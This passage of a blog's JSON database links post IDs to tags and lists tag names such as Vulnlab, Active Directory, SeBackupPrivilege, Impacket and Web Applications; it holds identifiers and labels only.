tuf0136cf17","_id":"clx1fcb3n0002w7ufc8l84kdh"},{"post_id":"clx1flim10000m8uf6jl1ckbg","tag_id":"clx0w93qc000167uf34i91h69","_id":"clx1flim40001m8ufboflfy7f"},{"post_id":"clx1flim10000m8uf6jl1ckbg","tag_id":"clx0u1gtn0002ttuf0136cf17","_id":"clx1flim70002m8uf943thy1z"},{"post_id":"clx24ijt60000iauf3kfs9jws","tag_id":"clx0w93qc000167uf34i91h69","_id":"clx24sjm40001iaufcvfk6v4g"},{"post_id":"clx24ijt60000iauf3kfs9jws","tag_id":"clx0u1gtn0002ttuf0136cf17","_id":"clx24sjm40002iaufhmt7appb"},{"post_id":"clx25bdl600005euf7v8v1ct4","tag_id":"clx0w93qc000167uf34i91h69","_id":"clx25bdla00015eufe0yl6p42"},{"post_id":"clx25bdl600005euf7v8v1ct4","tag_id":"clx0u1gtn0002ttuf0136cf17","_id":"clx25bdla00025euf3y8sfdoj"},{"post_id":"clx25k01g0000dbuf0icue0m7","tag_id":"clx0w93qc000167uf34i91h69","_id":"clx25k01j0001dbuf68eegyrv"},{"post_id":"clx25k01g0000dbuf0icue0m7","tag_id":"clx0u1gtn0002ttuf0136cf17","_id":"clx25k01k0002dbufaj0ae8gf"},{"post_id":"clx25tzi00000mluf348z4xs0","tag_id":"clx0w93qc000167uf34i91h69","_id":"clx25tzi40001mlufbn1a96fj"},{"post_id":"clx25tzi00000mluf348z4xs0","tag_id":"clx0u1gtn0002ttuf0136cf17","_id":"clx25tzi40002mluf47o3734v"},{"post_id":"clx27nekq0000ojufdoj836kf","tag_id":"clx0w93qc000167uf34i91h69","_id":"clx27nekz0003ojufczn38tdu"},{"post_id":"clx27nekq0000ojufdoj836kf","tag_id":"clx0u1gtn0002ttuf0136cf17","_id":"clx27nekz0004ojuf5uzegas2"},{"post_id":"clx27nekq0000ojufdoj836kf","tag_id":"clx27nekw0001ojufdshcgqkt","_id":"clx27nekz0005ojuf14uhcpxc"},{"post_id":"clx298b4g00003quf2ydfe7ua","tag_id":"clx0w93qc000167uf34i91h69","_id":"clx298b4v00013quf26e2btc0"},{"post_id":"clx298b4g00003quf2ydfe7ua","tag_id":"clx0u1gtn0002ttuf0136cf17","_id":"clx298b4v00023quf2xobcftd"},{"post_id":"clx298b4g00003quf2ydfe7ua","tag_id":"clx27nekw0001ojufdshcgqkt","_id":"clx298b4w00043qufbvm72ezz"},{"post_id":"clx29mygk0000g4ufep4t95ek","tag_id":"clx0w93qc000167uf34i91h69","_id":"clx2a4ago0002mnuffpnd4bmg"},{"post_id":"clx29mygk0000g4ufep4t95ek","tag_id":"clx2a4agk0000mnuf6s3ug3wc","_id":"clx2a4ago0003mnuf7i8b4rdr"},{"post_id":"clx2amfuw0000w8uf2ychh0z6","tag_id":"clx0w93qc000167uf34i91h69","_id":"clx2amfv10001w8uf7ve78zoc"},{"post_id":"clx2amfuw0000w8uf2ychh0z6","tag_id":"clx2a4agk0000mnuf6s3ug3wc","_id":"clx2amfv10002w8uf6pxpauky"},{"post_id":"clx2amfuw0000w8uf2ychh0z6","tag_id":"clx27nekw0001ojufdshcgqkt","_id":"clx2amfv10004w8uf4yb33k5x"},{"post_id":"clx2az5wx000081uffu7ggtes","tag_id":"clx0w93qc000167uf34i91h69","_id":"clx2az5xe000181uf01jt4vml"},{"post_id":"clx2az5wx000081uffu7ggtes","tag_id":"clx2a4agk0000mnuf6s3ug3wc","_id":"clx2az5xf000281uf7q652oic"},{"post_id":"clx2az5wx000081uffu7ggtes","tag_id":"clx27nekw0001ojufdshcgqkt","_id":"clx2az5xg000481uf7wc61osz"},{"post_id":"clx2nhkel000069ufcm3yhlor","tag_id":"clx2nhket000269ufhpjj41ae","_id":"clx2nhkeu000369ufbitsczpt"},{"post_id":"clx2nhkel000069ufcm3yhlor","tag_id":"clx0u1gtn0004ttuf5nfxalw1","_id":"clx2nhkeu000469uf764557lz"},{"post_id":"clx2o5x710000hpuf1vk37qeq","tag_id":"clx2nhket000269ufhpjj41ae","_id":"clx2o7hgs0003hpufdy256mr6"},{"post_id":"clx2o5x710000hpuf1vk37qeq","tag_id":"clx2o7hgp0002hpuf5udo60eu","_id":"clx2o7hgt0004hpuf2gc82epn"},{"post_id":"clxqttnri0000g5uf68he69yj","tag_id":"clx0w93qc000167uf34i91h69","_id":"clxqttnro0001g5ufaexph3fj"},{"post_id":"clxqttnri0000g5uf68he69yj","tag_id":"clx2a4agk0000mnuf6s3ug3wc","_id":"clxqttnro0002g5ufamrp8iu5"},{"post_id":"clxqttnri0000g5uf68he69yj","tag_id":"clx27nekw0001ojufdshcgqkt","_id":"clxqttnrp0004g5uf2k1m0584"},{"post_id":"clxz6kn8100009uuffenrg92u","tag_id":"clx0w93qc000167uf34i91h69","_id":"clxz6kn8800019uuf08pgd4jr"},{"post_id":"clxz6kn8100009uuffenrg92u","tag_id":"clx2a4agk0000mnuf6s3ug3wc","_id":"clxz6kn8800029uufc6ssf8o1"},{"post_id":"clxz6kn8100009uuffenrg92u","tag_id":"clx27nekw0001ojufdshcgqkt","_id":"clxz6kn8800049uuf5fig0bme"},{"post_id":"clxznjhrl00006muf11qxf3tb","tag_id":"clx0w93qc000167uf34i91h69","_id":"clxznjhrq00016muf4imv8pvt"},{"post_id":"clxznjhrl00006muf11qxf3tb","tag_id":"clx2a4agk0000mnuf6s3ug3wc","_id":"clxznjhrq00026mufcla20ze6"},{"post_id":"cly1tg7dz00007vuf8ghq4fy1","tag_id":"clx0w93qc000167uf34i91h69","_id":"cly1tg7e300017vuf22flej68"},{"post_id":"cly1tg7dz00007vuf8ghq4fy1","tag_id":"clx2a4agk0000mnuf6s3ug3wc","_id":"cly1tg7e300027vufbf8jck6r"},{"post_id":"cly6i0wne000080uf3r7keaqy","tag_id":"clx0w93qc000167uf34i91h69","_id":"cly6i0wng000180uf11hgf0bt"},{"post_id":"cly6i0wne000080uf3r7keaqy","tag_id":"clx0u1gtn0002ttuf0136cf17","_id":"cly6i0wnh000280uffcbb4kuq"},{"post_id":"clyb4ywdi000085uf04zt27em","tag_id":"clx0w93qc000167uf34i91h69","_id":"clyb4ywdn000185uff7t9668l"},{"post_id":"clyb4ywdi000085uf04zt27em","tag_id":"clx2a4agk0000mnuf6s3ug3wc","_id":"clyb4ywdn000285ufbd550ams"},{"post_id":"clyl4fcq500007quf7u3idsg4","tag_id":"clx0w93qc000167uf34i91h69","_id":"clyl4fcqa00017quf3xraei1p"},{"post_id":"clyl4fcq500007quf7u3idsg4","tag_id":"clx2a4agk0000mnuf6s3ug3wc","_id":"clyl4fcqb00027quffs54e5n8"},{"post_id":"clylvx4by00007xufd3mreogp","tag_id":"clx0w93qc000167uf34i91h69","_id":"clylvx4c300017xuf3t9s7kim"},{"post_id":"clylvx4by00007xufd3mreogp","tag_id":"clx2a4agk0000mnuf6s3ug3wc","_id":"clylvx4c400027xufcs70hocf"},{"post_id":"clzd67ybm0000atufed1z2ran","tag_id":"clx0w93qc000167uf34i91h69","_id":"clzd67ybq0001atuf9v5l9xhn"},{"post_id":"clzd67ybm0000atufed1z2ran","tag_id":"clx2a4agk0000mnuf6s3ug3wc","_id":"clzd67ybq0002atufgufrfxwc"},{"post_id":"clzlc8gnl0000d5uf5c1jgu6w","tag_id":"clx0w93qc000167uf34i91h69","_id":"clzlc8gnr0001d5ufd1dz7ra1"},{"post_id":"clzlc8gnl0000d5uf5c1jgu6w","tag_id":"clx2a4agk0000mnuf6s3ug3wc","_id":"clzlc8gnr0002d5ufg60phkxg"}],"Tag":[{"name":"Vulnlab","_id":"clx0u1gtm0001ttufeis42sot"},{"name":"Easy","_id":"clx0u1gtn0002ttuf0136cf17"},{"name":"Active Directory","_id":"clx0u1gtn0004ttuf5nfxalw1"},{"name":"Windows","_id":"clx0u1gto0005ttufh6113g6b"},{"name":"LDAP","_id":"clx0u1gto0006ttuf460h7ul9"},{"name":"SMB","_id":"clx0u1gto0007ttufgeez1czm"},{"name":"Bloodhound","_id":"clx0u1gto0008ttufg6gp43n0"},{"name":"Backup Admin","_id":"clx0u1gtp0009ttuf3yx957nq"},{"name":"SeBackupPrivilege","_id":"clx0u1gtp000attufbr1pdttf"},{"name":"Impacket","_id":"clx0u1gtq000bttuf7fhh1hyg"},{"name":"vulnlab","_id":"clx0w93qc000167uf34i91h69"},{"name":"CHAIN","_id":"clx27nekw0001ojufdshcgqkt"},{"name":"Medium","_id":"clx2a4agk0000mnuf6s3ug3wc"},{"name":"research","_id":"clx2nhket000269ufhpjj41ae"},{"name":"Web Applications","_id":"clx2o7hgp0002hpuf5udo60eu"}]}}